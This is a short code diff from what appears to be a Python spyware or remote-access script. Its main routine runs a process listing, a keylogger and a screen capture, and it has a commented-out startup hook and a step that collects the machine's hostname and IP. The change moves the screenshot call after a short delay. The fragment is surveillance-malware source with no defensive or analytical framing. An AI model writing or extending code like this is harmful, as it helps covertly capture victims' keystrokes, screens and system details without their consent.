@@ -84,11 +84,11 @@ def screenshot():
     screen = pyscreeze.screenshot("s.png")
 
 def Main():
-
-    screenshot()
     tasklist()
     Keylogger()
     #startup()
+    time.sleep(3)
+    screenshot()
 
     # Prend l'ip
     hostname = socket.gethostname()
